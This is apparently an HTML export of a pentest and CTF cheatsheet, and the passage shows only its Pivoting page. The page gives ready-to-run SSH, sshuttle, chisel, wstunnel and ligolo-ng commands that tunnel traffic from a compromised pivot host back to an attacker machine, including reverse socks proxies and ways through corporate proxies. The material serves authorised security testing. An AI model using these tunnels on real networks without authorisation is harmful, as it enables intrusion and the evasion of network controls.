.entity-chip{text-overflow:ellipsis;height:2.5em;overflow:hidden;text-align:start;display:block;white-space:nowrap}.entity-list-item-image{align-self:stretch;width:140px;flex:none;background-size:cover;background-position:50% 50%;border-radius:3px;position:relative;margin-inline-end:24px}.entity-list-item-image.entity-list-item-image-wide{width:220px}.entity-list-item-image .svg-icon{color:#fff;font-size:1.66rem;margin-inline-end:0;position:absolute;bottom:6px;left:6px}html.dark-mode .entity-list-item-image .svg-icon{color:rgba(255,255,255,.6)}@media screen and (max-width: 880px){.entity-list-item-image{width:80px}}.chapter>.entity-list-item-image{width:60px}.entity-list.compact{font-size:8.4px}.entity-list.compact h4,.entity-list.compact a{line-height:1.2}.entity-list.compact .entity-item-snippet{display:none}.entity-list.compact .entity-list-item p{font-size:11.2px;padding-top:6px}.entity-list.compact p{margin:0}.entity-list.compact>p.empty-text{display:block;font-size:14px}.entity-list.compact hr{margin:0}@media screen and (max-width: 880px){.entity-list.compact h4{font-size:1.666em}}.entity-item-tags{font-size:.75rem;opacity:1}.entity-item-tags .primary-background-light{background:transparent}.entity-item-tags .tag-name{background-color:rgba(0,0,0,.05)}.dropdown-container{display:inline-block;vertical-align:top;position:relative}.dropdown-menu{display:none;position:absolute;z-index:999;top:0;list-style:none;right:0;margin:16px 0;background-color:#fff;box-shadow:0 2px 4px rgba(0,0,0,.18);border-radius:1px;min-width:180px;padding:6px 0;color:#555;fill:currentColor;text-align:start !important;max-height:500px;overflow-y:auto}html.dark-mode .dropdown-menu{background-color:#333}html.dark-mode .dropdown-menu{color:#eee}.dropdown-menu.wide{min-width:220px}.dropdown-menu .text-muted{color:#999;fill:#999}.dropdown-menu li.active a{font-weight:600}.dropdown-menu a,.dropdown-menu button{display:block;padding:6px 16px;color:#555;fill:currentColor;white-space:nowrap;line-height:1.6;cursor:pointer}html.dark-mode .dropdown-menu a,html.dark-mode .dropdown-menu button{color:#eee}.dropdown-menu a:hover,.dropdown-menu a:focus,.dropdown-menu button:hover,.dropdown-menu button:focus{text-decoration:none;background-color:var(--color-primary-light);color:var(--color-primary)}.dropdown-menu a:focus,.dropdown-menu button:focus{outline:1px solid var(--color-primary);outline-offset:-2px}.dropdown-menu a svg,.dropdown-menu button svg{margin-inline-end:12px;display:inline-block;width:16px}.dropdown-menu button{width:100%;text-align:start}.dropdown-menu li.border-bottom{border-bottom:1px solid #ddd}.dropdown-menu li hr{margin:6px 0}.featured-image-container{position:relative;overflow:hidden;min-height:140px;background-size:cover;background-position:50% 50%;transition:opacity ease-in-out 240ms}.featured-image-container a{display:block}.featured-image-container img{display:block;width:100%;max-width:100%;height:auto}.featured-image-container-wrap{position:relative}.featured-image-container-wrap .svg-icon{color:#fff;font-size:2rem;margin-inline-end:0;position:absolute;bottom:10px;left:6px}html.dark-mode .featured-image-container-wrap .svg-icon{color:rgba(255,255,255,.6)}.grid-card:hover .featured-image-container{opacity:.5}.action-link{background:transparent;border:none;color:currentColor;padding:16px 0}.active-link-list a{display:inline-block;padding:12px}.active-link-list a:not(.active){color:#444}html.dark-mode .active-link-list a:not(.active){color:#666}.active-link-list a:hover{background-color:rgba(0,0,0,.05);border-radius:3px;text-decoration:none}html.dark-mode .active-link-list a:hover{background-color:rgba(255,255,255,.05)}.page-editor{display:flex;flex-direction:column;align-items:stretch;overflow:hidden}.page-editor .edit-area{flex:1;flex-direction:column;z-index:10}.page-editor .mce-tinymce{box-shadow:none}.page-editor .mce-top-part::before{box-shadow:none}body.mce-fullscreen .page-editor .edit-area,body.markdown-fullscreen .page-editor .edit-area{z-index:12}body.mce-fullscreen .page-editor,body.mce-fullscreen .flex-fill,body.markdown-fullscreen .page-editor,body.markdown-fullscreen .flex-fill{overflow:visible}@media screen and (max-width: 600px){.page-edit-toolbar{overflow-x:scroll;overflow-y:visible}.page-edit-toolbar .grid.third{display:block;white-space:nowrap}.page-edit-toolbar .grid.third>div{display:inline-block}}.page-save-mobile-button{position:fixed;z-index:30;border-radius:50%;width:56px;height:56px;font-size:24px;right:16px;bottom:12px;box-shadow:0 2px 2px 1px rgba(0,0,0,.13);background-color:currentColor;text-align:center}.page-save-mobile-button svg{fill:#fff;margin-inline-end:0}.draft-notification{pointer-events:none;transform:scale(0);transition:transform ease-in-out 120ms;transform-origin:50% 50%}.draft-notification.visible{transform:scale(1)}.page-style.editor{padding:0 !important}.page-content{width:100%;max-width:840px;margin:0 auto;overflow-wrap:break-word}.page-content .align-left{text-align:left}.page-content img.align-left,.page-content table.align-left{float:left !important;margin:6px 16px 16px 0}.page-content .align-right{text-align:right !important}.page-content img.align-right,.page-content table.align-right{float:right !important;margin:6px 0 6px 12px}.page-content .align-center{text-align:center}.page-content img.align-center{display:block}.page-content img.align-center,.page-content table.align-center{margin-left:auto;margin-right:auto}.page-content img{max-width:100%;height:auto}.page-content h1,.page-content h2,.page-content h3,.page-content h4,.page-content h5,.page-content h6,.page-content pre{clear:left}.page-content hr{clear:both;margin:16px 0}.page-content table{hyphens:auto;table-layout:fixed;max-width:100%;height:auto !important}.page-content ins,.page-content del{text-decoration:none}.page-content ins{background:#dbffdb}.page-content del{background:#ffecec}.page-content.page-revision pre code{white-space:pre-wrap}.pointer-container{position:relative;display:none;left:0;z-index:10}.pointer{border:1px solid #ccc;border-color:#ccc;display:flex;align-items:center;justify-items:center;padding:12px 12px;border-radius:4px;box-shadow:0 0 12px 1px rgba(0,0,0,.1);position:absolute;top:-60px;background-color:#fff;width:275px;z-index:55}html.dark-mode .pointer{border-color:#000}html.dark-mode .pointer{background-color:#333}.pointer.is-page-editable{width:328px}.pointer:before{position:absolute;left:50%;bottom:-9px;width:16px;height:16px;margin-inline-start:-8px;content:"";display:block;transform:rotate(45deg);transform-origin:50% 50%;border-block-end:1px solid #ccc;border-inline-end:1px solid #ccc;z-index:56;background-color:#fff;border-color:#ccc}html.dark-mode .pointer:before{background-color:#333}html.dark-mode .pointer:before{border-color:#000}.pointer input,.pointer button,.pointer a{position:relative;border-radius:0;height:28px;font-size:12px;vertical-align:top;padding:5px 16px}.pointer input{background-color:#fff;border:1px solid #ddd;border-color:#ddd;color:#666;width:172px;z-index:40;padding:5px 10px}html.dark-mode .pointer input{border-color:#000}.pointer span.icon{fill:#444;cursor:pointer;user-select:none;display:inline-block;line-height:1}.pointer .input-group .button{line-height:1;margin:0 0 0 -4px;box-shadow:none}.pointer a.button{margin:0}.pointer .svg-icon{width:1.2em;height:1.2em}.pointer .button{border-color:#ddd}html.dark-mode .pointer .button{border-color:#000}.floating-toolbox{border:1px solid #ddd;background-color:#fff;border-color:#ddd;right:64px;width:48px;overflow:hidden;align-items:stretch;flex-direction:row;display:flex;transition:width ease-in-out 180ms;margin-top:-1px;min-height:0}html.dark-mode .floating-toolbox{background-color:#222}html.dark-mode .floating-toolbox{border-color:#000}.floating-toolbox.open{width:480px}.floating-toolbox [toolbox-toggle] svg{transition:transform ease-in-out 180ms}.floating-toolbox [toolbox-toggle]{transition:background-color ease-in-out 180ms}.floating-toolbox.open [toolbox-toggle]{background-color:rgba(255,0,0,.29)}.floating-toolbox.open [toolbox-toggle] svg{transform:rotate(180deg)}.floating-toolbox>div{flex:1;position:relative}.floating-toolbox .tabs{display:block;border-inline-end:1px solid #ddd;border-color:#ddd;width:48px;flex:0 1 auto}html.dark-mode .floating-toolbox .tabs{border-color:#000}.floating-toolbox .tabs svg{padding:0;margin:0}.floating-toolbox .tabs>button{color:rgba(0,0,0,.5);display:block;cursor:pointer;padding:12px 16px;font-size:16px;line-height:1.6;border-bottom:1px solid rgba(255,255,255,.3)}html.dark-mode .floating-toolbox .tabs>button{color:rgba(255,255,255,.5)}.floating-toolbox.open .tabs>button.active{color:#444;background-color:rgba(0,0,0,.1)}html.dark-mode .floating-toolbox.open .tabs>button.active{color:#eee}.floating-toolbox div[toolbox-tab-content]{padding-bottom:45px;display:flex;flex:1;flex-direction:column;min-height:0;overflow-y:scroll}.floating-toolbox h4{font-size:24px;margin:16px 0 0 0;padding:0 24px 12px 24px}.floating-toolbox .tags input{max-width:100%;width:100%;min-width:50px}.floating-toolbox .tags td,.floating-toolbox .inline-start-table>div>div>div{padding-inline-end:12px;padding-top:12px;position:relative}.floating-toolbox .handle{user-select:none;cursor:move;fill:#999}.floating-toolbox form{display:flex;flex:1;flex-direction:column;overflow-y:scroll}.floating-toolbox table td,.floating-toolbox table th{overflow:visible}[toolbox-tab-content]{display:none}.suggestion-box{top:auto;margin:-4px 0 0;right:auto;left:0;padding:0}.suggestion-box li{display:block;border-bottom:1px solid #ddd}.suggestion-box li:last-child{border-bottom:0}.comments-container h5{color:#888;font-weight:normal;margin-top:.5em}.comment-editor .CodeMirror,.comment-editor .CodeMirror-scroll{min-height:175px}.mce-floatpanel[aria-label="Insert/edit media"] .mce-open{display:none}.entity-list-item>span:first-child,.icon-list-item>span:first-child,.chapter-expansion>.icon{font-size:.8rem;width:1.88em;height:1.88em;display:flex;align-items:center;justify-content:center;text-align:center;border-radius:1em;position:relative;overflow:hidden}.entity-list-item>span:first-child svg,.icon-list-item>span:first-child svg,.chapter-expansion>.icon svg{margin:0;bottom:0}.entity-list-item>span:first-child:after,.icon-list-item>span:first-child:after,.chapter-expansion>.icon:after{content:"";position:absolute;background-color:currentColor;opacity:.2;left:0;top:0;width:100%;height:100%}.entity-chip{display:inline-block;align-items:center;justify-content:center;text-align:center;font-size:.9em;border-radius:3px;position:relative;overflow:hidden;padding:6px 12px;fill:currentColor;opacity:.85;transition:opacity ease-in-out 120ms}.entity-chip:after{content:"";position:absolute;background-color:currentColor;opacity:.15;left:0;top:0;width:100%;height:100%}.entity-chip:hover{text-decoration:none;opacity:1}html,body{background-color:#fff}body{font-family:"DejaVu Sans",-apple-system,BlinkMacSystemFont,"Segoe UI","Oxygen","Ubuntu","Roboto","Cantarell","Fira Sans","Droid Sans","Helvetica Neue",sans-serif;margin:0;padding:0;display:block}table{border-spacing:0;border-collapse:collapse}.page-content{overflow:hidden}pre{padding-left:12px}pre:after{display:none}pre code{white-space:pre-wrap}.page-break{page-break-after:always}@media screen{.page-break{border-top:1px solid #ddd}}ul.contents ul li{list-style:circle}.chapter-hint{color:#888;margin-top:32px}.chapter-hint+h1{margin-top:0}/*# sourceMappingURL=export-styles.css.map */

    </style>

    <!-- Custom user content -->
<link rel="stylesheet" href="https://hideandsec.sh/css/dark-theme.css"><style>
@import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:ital,wght@0,400;0,600;0,700;0,900;1,400;1,600;1,700;1,900&display=swap');
body {
  font-family: 'Source Sans Pro', sans-serif !important;
  font-size: 16px;
  background-color: #0f1115;
  color:#f8f8f2
}
h1 {
  font-family: "Roboto", sans-serif!important;
}
/* a href fix */
div.page-content a:link {
  color: #00ccff !important;
}

div.page-content a:visited {
  color: #00ccff !important;
}

div.page-content a:hover {
  color: #00ccff !important;
}

div.page-content a:active {
  color: #00ccff !important;
}

code {color:#50fa7b;background-color:#202020;white-space:pre-line;padding:4px 3px;border-color:#FFFAFA57;}
.page-content del {background: #FF5555!important;}
.card .entity-list-item:not(.no-hover):hover {background-color: #44475a !important;}
.page-content ins {background: #50fa7b!important;color: #08090b!important;}
.suggestion-box {background-color: #08090b!important;border: 1px solid #BBB;box-shadow: none!important;border-radius: 0!important;}
.suggestion-box li:last-child {border-bottom: 0; }
.suggestion-box li.active {background-color: #44475a!important;}
.card .entity-list-item:not(.no-hover):hover {background-color: #44475a!important;}
.card-title {text-transform: uppercase;color: #f8f8f2;fill: #f8f8f2;font-weight: 400;}
.markdown-editor-display{background-color: #08090b;}
.markdown-editor-display body {background-color: #08090b;}
.breadcrumb-listing-entity-list {background-color:#08090b!important;}
.breadcrumb-listing .breadcrumb-listing-toggle:hover {fill: #f8f8f2;border-color: transparent;}
.entity-meta {fill:#f8f8f2!important;}
.book-tree .sidebar-page-list .entity-list-item.selected {background-color:#44475a;}
table.table tr:hover {background-color:#44475a;}
.tri-layout-mobile-tab:first-child {border-right: 0;background: #08090b;}
.tri-layout-mobile-tab {text-align: center;border-bottom: 0;cursor: pointer;background: #282a36;}
.tri-layout-mobile-tab.active {border-bottom-color: none;background: #44475a;}
.tri-layout-mobile-tabs {border:0;}
.entity-selector .entity-list-item {background-color:#08090b;}
.entity-selector {border:0}
blockquote{border-left: 4px solid #8be9fd;background-color: transparent!important;}
header .header-links {background-color: transparent;}
header .links a:hover, header .dropdown-container ul li a:hover {background-color:#44475a;}
@media screen and (max-width: 1000px) {header .header-links {background-color: #08090b;}}
#header{background-color:#191b20!important;}
div.CodeMirror {border:0; border-radius: 8px;}
form[action*="https://hideandsec.sh/settings/users/toggle-dark-mode"] {display: none;}
form[action*="https://hideandsec.sh/settings/users/2/switch-shelves-view"] {display: none;}
a[href*='/export/pdf'] {display: none;}
img.coolpicture {display: none;}
</style><link rel="stylesheet" href="https://hideandsec.sh/css/codemirror.css"><!-- Matomo --><!-- End Matomo Code --><!-- Custom JS -->
<!-- End custom user content -->
</head>
<body>
<div class="page-content">
        <h1 style="font-size: 4.8em">Cheatsheets</h1>

    <p>Articles with ready to use commands for pentest and CTF</p>

            <ul class="contents">
                            <li><a href="#page-56">Pivoting</a></li>
                                            <li><a href="#chapter-30">Microsoft</a></li>
                                    <ul>
                                                    <li><a href="#page-59">Active Directory</a></li>
                                                    <li><a href="#page-66">Active Directory Certificate Services</a></li>
                                                    <li><a href="#page-71">Active Directory - Python edition</a></li>
                                                    <li><a href="#page-81">System Center Configuration Manager</a></li>
                                            </ul>
                                            <li><a href="#page-73">Reverse shells</a></li>
                                            <li><a href="#page-74">Spawning TTY Shells</a></li>
                                            <li><a href="#page-78">Bug Bounty</a></li>
                                    </ul>
    
            <div class="page-break"></div>
        <h1 id="page-56">Pivoting</h1>

                    <p id="bkmrk-this-cheatsheet-is-b">This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs, and other resources found on the web or through my experience. This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter <a href="https://twitter.com/BlWasp_">@BlWasp_</a>.</p>
<p id="bkmrk-i-will-try-to-put-as">I will try to put as many links as possible at the end of the page to direct to more complete resources.</p>
<h2 id="bkmrk-pivoting-with-ssh">Pivoting with SSH</h2>
<p id="bkmrk-ssh-one-of-the-simpl">SSH one of the simplest techniques, and one that's built in by default, to perform pivoting. Present by default on Linux and MacOS, <strong>SSH is now integrated in Windows 11 by default!</strong></p>
<h3 id="bkmrk-local-port-forwardin">Local Port Forwarding</h3>
<p id="bkmrk-the-principle-is-tha">The principle is that the client listens on a port, and anything it receives on that port is sent directly to an SSH server, which forwards the connection to a target server, potentially a different one. This is also useful if you want to access a port that is only open locally on the SSH server (<code>127.0.0.1</code> as the destination IP).</p>
<p id="bkmrk-all-requests-made-on">All requests made on <code>127.0.0.1:1080</code> will be transferred to the machine <code>$TARGET</code> via <code>$PIVOT</code> :</p>
<pre id="bkmrk-ssh-user%40ssh_server-"><code class="language-bash">ssh user@ssh_server -L [bind_address:]local_port:destination_host:destination_hostport
ssh user1@$PIVOT -L [127.0.0.1:]1080:$TARGET:80 -N
</code></pre>
<h3 id="bkmrk-%28reverse%29-remote-por">(Reverse) Remote Port Forwarding</h3>
<p id="bkmrk-in-this-case%2C-the-pi">In this case, the pivot machine (client) connects to the attacker's machine (server), and a listening port on the attacking machine (i.e. the server) allows the traffic to pass through the SSH tunnel.</p>
<ul id="bkmrk-have-a-session-on-th"><li>Have a session on the pivot machine</li>
<li>Launch an ssh server on our machine</li>
<li>Create a dedicated account without a shell on our machine to limit hackback</li>
<li>Launch the reverse from the pivot machine</li>
<li>Request <code>127.0.0.1:1080</code> to reach <code>$TARGET:80</code>
</li>
</ul><pre id="bkmrk-ssh-user%40ssh_server--0"><code class="language-bash">ssh user@ssh_server -R [bind_address:]remote_port:destination_host:destination_hostport
</code></pre>
<pre id="bkmrk-%23-on-the-attacker-ma"><code class="language-bash"># On the attacker machine
sudo systemctl start sshd
sudo useradd sshpivot --no-create-home --shell /bin/false
sudo passwd sshpivot

# On the pivot machine
ssh sshpivot@$ATTACKER -R 127.0.0.1:1080:$TARGET:80 -N
</code></pre>
<p id="bkmrk-to-be-more-general%2C-">To be more general, and use the listening port like a socks. Particularly useful for reaching an internal network from a compromised machine connected in reverse to a remote attacking machine.</p>
<pre id="bkmrk-%23-on-the-pivot-machi"><code class="language-bash"># On the pivot machine
ssh sshpivot@$ATTACKER -R 1080 -N

# On the attacker machine
proxychains4 -q nxc smb $TARGET
</code></pre>
<p id="bkmrk-as-an-alternative%2C-3">As an alternative, <a href="https://github.com/3proxy/3proxy">3proxy </a>can be used on the pivot machine:</p>
<pre id="bkmrk-chmod-u%2Bx-socks-.%2Fso"><code class="language-bash">chmod u+x socks
./socks '-?'
./socks -p10080 -tstop -d
ssh sshpivot@$ATTACKER -R 127.0.0.1:1080:127.0.0.1:10080 -N
</code></pre>
<h3 id="bkmrk-ssh-dynamic-port-for">SSH Dynamic Port Forwarding</h3>
<p id="bkmrk-similar-to-local-por">Similar to Local Port Forwarding, but opens a socks proxy to forward everything dynamically.</p>
<pre id="bkmrk-ssh-user%40ssh_server--1"><code class="language-bash">ssh user@ssh_server -D [bind_address:]local_port
ssh user1@$PIVOT -D 127.0.0.1:1080 -N
</code></pre>
<p id="bkmrk-any-service-on-a-tar">Any service on a target machine behing the pivot can be requested via the proxy:</p>
<pre id="bkmrk-curl---head-http%3A%2F%2F%24"><code class="language-bash">curl --head http://$TARGET --proxy socks5://127.0.0.1:1080
proxychains4 -q nxc smb $TARGET
</code></pre>
<h3 id="bkmrk-vpn-over-ssh">VPN over SSH</h3>
<p id="bkmrk-openssh-can-be-used-"><strong>Openssh</strong> can be used to perform pivoting with a VPN.</p>
<ol id="bkmrk-choose-a-subnet-that"><li>Choose a subnet that is not present on both sides of the tunnel
<ul><li>Current network: <code>192.168.2.0/24</code>
</li>
<li>Target network: <code>10.42.42.0/24</code>
</li>
<li>Created network: <code>10.43.43.0/30</code>
</li>
</ul></li>
<li>Authorize <strong>tun device forwarding</strong> : <code>PermitTunnel yes</code> in <code>/etc/ssh/sshd_config</code>
</li>
<li>Create a tun interface on the pivot machine and our machine (requires <strong>root</strong>)</li>
</ol><h4 id="bkmrk-solution-1-%28not-reco">Solution 1 (not recommended)</h4>
<p id="bkmrk-letting-openssh-crea">Letting openssh create the interfaces itself: implies opening the tunnel as root on our machine (<code>sudo</code>) and using the root account of the pivot machine: risk of hackback.</p>
<pre id="bkmrk-%23-on-the-attacker-ma-0"><code class="language-bash"># On the attacker machine
sudo ssh root@$PIVOT -w any:any
</code></pre>
<h4 id="bkmrk-solution-2-%28recommen">Solution 2 (recommended)</h4>
<p id="bkmrk-manual-creation-and-">Manual creation and destruction of interfaces.</p>
<p id="bkmrk-on-the-pivot-machine">On the <strong>pivot machine</strong>:</p>
<pre id="bkmrk-sudo-ip-tuntap-add-d"><code class="language-bash">sudo ip tuntap add dev tun0 mode tun
sudo ip addr add 10.43.43.1/30 peer 10.43.43.2 dev tun0
sudo ip link set tun0 up

sudo sysctl net.ipv4.conf.default.forwarding=1
</code></pre>
<p id="bkmrk-on-the-attacker-mach">On the <strong>attacker machine</strong>:</p>
<pre id="bkmrk-sudo-ip-tuntap-add-d-0"><code class="language-bash">sudo ip tuntap add dev tun0 mode tun
sudo ip addr add 10.43.43.2/30 peer 10.43.43.1 dev tun0
sudo ip link set tun0 up

ssh user1@$PIVOT -w 0:0
#-w permits to specify the interface numbers
</code></pre>
<p id="bkmrk-setup-nat-on-the-piv">Setup NAT on the <strong>pivot machine</strong>:</p>
<pre id="bkmrk-sudo-iptables--t-nat"><code class="language-bash">sudo iptables -t nat -A POSTROUTING -s 10.43.43.2 -o eth1 -j MASQUERADE
# Or
sudo iptables -t nat -A POSTROUTING -s 10.43.43.2 -d 10.42.42.0/24 -j MASQUERADE
</code></pre>
<p id="bkmrk-to-use-arp-proxy-ins">To use ARP proxy instead of NAT:</p>
<pre id="bkmrk-sudo-sysctl-net.ipv4"><code class="language-bash">sudo sysctl net.ipv4.conf.eth0.proxy_arp=1
sudo ip neigh add proxy 10.43.43.2 dev eth0
</code></pre>
<p id="bkmrk-setup-route-on-the-a">Setup route on the attacker machine:</p>
<pre id="bkmrk-sudo-ip-route-add-10"><code class="language-bash">sudo ip route add 10.42.42.0/24 via 10.43.43.1
</code></pre>
<h3 id="bkmrk-sshuttle---transpare">sshuttle - Transparent proxy over SSH</h3>
<p id="bkmrk-sshuttle-is-a-transp"><a href="https://github.com/sshuttle/sshuttle">sshuttle</a> is a transparent proxy server that works as VPN over SSH.</p>
<p id="bkmrk-it-works-on%3A-linux-a">It works on: <strong>Linux and MacOS</strong>.</p>
<p id="bkmrk-to-forward-all-traff">To forward all traffic to the <code>$TARGET/24</code> network:</p>
<pre id="bkmrk-sshuttle--r-user1%40%24p"><code class="language-bash">sshuttle -r user1@$PIVOT $TARGET/24

# With a RSA key
sudo python3 -m sshuttle -v -r $PIVOT $TARGET/24 --ssh-cmd 'ssh -i id_rsa'
</code></pre>
<p id="bkmrk-to-let-sshuttle-auto">To let sshuttle automatically detect available networks (<code>-x</code> allows you to exclude a network)</p>
<pre id="bkmrk-sshuttle--vnr-user1%40"><code class="language-bash">sshuttle -vNr user1@$PIVOT -x $EXCLUDE/24
</code></pre>
<h3 id="bkmrk-plink---ancient-wind">Plink - Ancient Windows SSH agent</h3>
<p id="bkmrk-plink-%28putty-link%29-i">Plink (PuTTY Link) is a Windows SSH client, useful on previous Windows version where SSH was not installed by default.</p>
<p id="bkmrk-it-works-like-a-stan">It works like a standard SSH agent. Here a Remote Port Forwarding example:</p>
<pre id="bkmrk-.%2Fplink.exe--l-%24user"><code class="language-powershell">./plink.exe -l $USERNAME -R 1080:$TARGET:80 $ATTACKER
</code></pre>
<h2 id="bkmrk-pivoting-with-http">Pivoting with HTTP</h2>
<h3 id="bkmrk-chisel">Chisel</h3>
<p id="bkmrk-chisel-is-a-fast-tcp"><a href="https://github.com/jpillora/chisel">Chisel </a>is a fast TCP/UDP tunnel over HTTP that supports SSH. A C# version exists, <a href="https://github.com/shantanu561993/SharpChisel">SharpChisel</a>.</p>
<p id="bkmrk-it-works-on%3A-linux%2C-">It works on: <strong>Linux, Windows and MacOS</strong>.</p>
<h4 id="bkmrk-local-port-forwardin-0">Local Port Forwarding</h4>
<pre id="bkmrk-%23-on-the-pivot-machi-0"><code class="language-bash"># On the pivot machine
chisel server -p 8080 --host $interfaceoListenOn -v

# On the attacker machine
chisel client -v http://$PIVOT:8080 127.0.0.1:1080:$TARGET:80
</code></pre>
<h4 id="bkmrk-local-port-forwardin-1">Local Port Forwarding + socks proxy</h4>
<p id="bkmrk-this-configuration-p">This configuration permits to setup a local socks proxy and tunnel any communication.</p>
<pre id="bkmrk-%23-on-the-pivot-machi-1"><code class="language-bash"># On the pivot machine
chisel server -p 8080 --host $interfaceoListenOn --socks5 -v

# On the attacker machine
chisel client -v http://$PIVOT:8080 127.0.0.1:1080:socks

# Example to pass through
curl –head http://$TARGET –proxy socks5://127.0.0.1:1080
</code></pre>
<h4 id="bkmrk-remote-port-forwardi">Remote Port Forwarding</h4>
<pre id="bkmrk-%23-on-the-attacker-ma-1"><code class="language-bash"># On the attacker machine
chisel server -p 8888 --host $interfaceoListenOn --reverse -v

# On the pivot machine
chisel client -v http://$ATTACKER:8888 R:127.0.0.1:80:$TARGET:80
</code></pre>
<h4 id="bkmrk-reverse-socks-proxy">Reverse socks proxy</h4>
<pre id="bkmrk-%23-on-the-attacker-ma-2"><code class="language-bash"># On the attacker machine
chisel server -p 8080 --reverse

# On the pivot machine
chisel client $ATTACKER:8080 R:socks
</code></pre>
<p id="bkmrk-then%2C-apply-the-foll">Then, apply the following configuration to Proxychains:</p>
<pre id="bkmrk-socks5-127.0.0.1-108"><code>socks5    127.0.0.1 1080
</code></pre>
<h3 id="bkmrk-wstunnel">wstunnel</h3>
<p id="bkmrk-wstunnel-is-a-tool-t"><a href="https://github.com/erebe/wstunnel">wstunnel </a>is a tool that allows pivoting via WebSockets and HTTP/2.</p>
<p id="bkmrk-it-works-on%3A-linux%2C--0">It works on: <strong>Linux, Windows and MacOS</strong>.</p>
<h4 id="bkmrk-standard-socks-proxy">Standard socks proxy</h4>
<p id="bkmrk-start-a-websocket-se">Start a WebSocket server on the pivot machine, and open a WebSocket tunnel from the attacker machine to the server. </p>
<p id="bkmrk-aditionally%2C-the-sec">Aditionally, the second command will create a socks5 server listening on port <code>1080</code> of the loopback interface and will forward traffic dynamically.</p>
<pre id="bkmrk-%23-on-the-pivot-machi-2"><code class="language-bash"># On the pivot machine
wstunnel server wss://[::]:8080

# On the attacker machine
wstunnel client -L socks5://127.0.0.1:1080 wss://$PIVOT:8080
</code></pre>
<p id="bkmrk-then%2C-here-is-an-exa">Then, here is an example of usage:</p>
<pre id="bkmrk-curl--x-socks5h%3A%2F%2F12"><code class="language-bash">curl -x socks5h://127.0.0.1:8888 http://$TARGET
</code></pre>
<h4 id="bkmrk-reverse-socks-proxy-0">Reverse socks proxy</h4>
<pre id="bkmrk-%23-on-the-attacker-ma-3"><code class="language-bash"># On the attacker machine
wstunnel server wss://[::]:443

# On the pivot machine
wstunnel client -R socks5://0.0.0.0:1080 wss://$ATTACKER:443
</code></pre>
<p id="bkmrk-then%2C-apply-the-foll-0">Then, apply the following configuration to Proxychains on the attacker machine:</p>
<pre id="bkmrk-socks5-127.0.0.1-108-0"><code>socks5    127.0.0.1 1080
</code></pre>
<h4 id="bkmrk-behind-a-proxy">Behind a proxy</h4>
<p id="bkmrk-in-case-the-client-i">In case the client is behind a proxy (for example, a corporate proxy), it can be passed to the client. For example, with the previous command:</p>
<pre id="bkmrk-wstunnel-client--r-s"><code class="language-bash">wstunnel client -R socks5://0.0.0.0:1080 wss://$ATTACKER:443 -p $USER:$PASS@$proxyURL:$PORT
</code></pre>
<h2 id="bkmrk-pivoting-in-vpn-styl">Pivoting in VPN style</h2>
<h3 id="bkmrk-vpn-pivot---vpn-tunn">VPN Pivot - VPN Tunnel</h3>
<p id="bkmrk-presents-here%2C-but-n">Presents <a href="https://github.com/0x36/VPNPivot">here</a>, but <strong>no more maintened</strong>.</p>
<p id="bkmrk-same-idea-as-with-ss">Same idea as with SSH VPN, but here we use TLS/SSL instead of SSH. It will create a virtual interface (tap) on the attacker machine.</p>
<pre id="bkmrk-%23-on-the-attacker-ma-4"><code class="language-bash"># On the attacker machine
sudo pivots -i tun1 -I $newInterfaceIP/24 -p $listeningPort -v

# On the pivot machine
sudo sysctl net.ipv4.conf.default.forwarding=1
sudo pivotc $ATTACKER $listeningPort $targetNetwork

sudo iptables -t nat -A POSTROUTING -s $ATTACKER -o $INTERFACE -j MASQUERADE
sudo iptables -t nat -A POSTROUTING -s $ATTACKER -d $targetNetwork -j MASQUERADE
</code></pre>
<h3 id="bkmrk-ligolo-ng">Ligolo-ng</h3>
<p id="bkmrk-ligolo-ng-is-a-tunne"><a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a> is a tunneling tool that leverages TUN interfaces.</p>
<p id="bkmrk-it-works-on%3A-linux%2C--1">It works on: <strong>Linux, Windows and MacOS</strong>.</p>
<h4 id="bkmrk-simple-tunneling">Simple tunneling</h4>
<p id="bkmrk-on-the-attacker-mach-0">On the attacker machine, start the listener:</p>
<pre id="bkmrk-%23-automatically-requ"><code class="language-bash"># Automatically request LetsEncrypt certificates or use self-signed certificates
./proxy [-autocert | -selfcert] -laddr 0.0.0.0:443
</code></pre>
<p id="bkmrk-on-the-pivot-machine-0">On the pivot machine, start the agent:</p>
<pre id="bkmrk-.%2Fagent--connect-%24at"><code class="language-bash">./agent -connect $ATTACKER:443 [-ignore-cert]
</code></pre>
<p id="bkmrk-then%2C-on-the-server-">Then, on the server select the opened session and run the <code>autoroute</code> to setup everything automatically. You will have to chose which routes to tunnel, and so on:</p>
<pre id="bkmrk-ligolo-ng-%C2%BB-session-"><code class="language-bash">ligolo-ng » session
[Agent : $SESSION] » autoroute
</code></pre>
<p id="bkmrk-it-is-then-possible-">It is then possible to use all your tools without Proxychains or anything else. Everything will be routed through the <code>tun</code> interface.</p>
<h4 id="bkmrk-behind-a-proxy-0">Behind a proxy</h4>
<p id="bkmrk-in-case-the-client-i-0">In case the client is behind a proxy (for example, a corporate proxy), it can be passed to the client. In this case, the WebSocket mode must be used.</p>
<p id="bkmrk-on-the-attacker-mach-1">On the attacker machine, start the listener with HTTPS:</p>
<pre id="bkmrk-%23-automatically-requ-0"><code class="language-bash"># Automatically request LetsEncrypt certificates or use self-signed certificates
./proxy [-autocert | -selfcert] -laddr https://0.0.0.0:443
</code></pre>
<p id="bkmrk-on-the-pivot-machine-1">On the pivot machine, start the agent and specify the proxy address:</p>
<pre id="bkmrk-.%2Fagent--connect-htt"><code class="language-bash">./agent -connect https://$ATTACKER:443 -proxy http://$proxyAddr:$proxyPort [-ignore-cert]
</code></pre>
<h4 id="bkmrk-double-pivoting">Double pivoting</h4>
<p id="bkmrk-this-case-is-useful-">This case is useful when you compromised a first target that can contact your server, and you have also compromised a second machine that is able to contact your first target, and another network, which is the final goal. And this second machine is not able to contact your server.</p>
<p id="bkmrk-on-the-attacker-mach-2">On the attacker machine, start the listener:</p>
<pre id="bkmrk-%23-automatically-requ-1"><code class="language-bash"># Automatically request LetsEncrypt certificates or use self-signed certificates
./proxy [-autocert | -selfcert] -laddr 0.0.0.0:443
</code></pre>
<p id="bkmrk-on-the-first-pivot-m">On the first pivot machine, start the agent:</p>
<pre id="bkmrk-.%2Fagent--connect-%24at-0"><code class="language-bash">./agent -connect $ATTACKER:443 [-ignore-cert]
</code></pre>
